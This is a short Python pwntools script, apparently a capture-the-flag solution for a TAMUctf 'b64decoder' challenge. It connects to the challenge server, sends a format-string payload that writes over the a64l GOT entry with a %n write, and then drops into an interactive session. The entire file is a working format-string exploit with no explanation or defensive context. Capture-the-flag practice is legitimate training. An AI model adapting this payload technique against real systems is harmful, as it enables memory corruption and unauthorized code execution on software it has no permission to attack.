from pwn import *
#io=process("./b64decoder")
io=remote("challenges.tamuctf.com", 2783)
a64l_got = 0x0804b398
a64l_got2 = 0x0804b39a
#gdb.attach(io,"set follow-fork-mode parent")

io.recvuntil("Enter your name!")
payload = "%134516848x%75$n" + p32(a64l_got)
io.sendline(payload)

io.interactive()
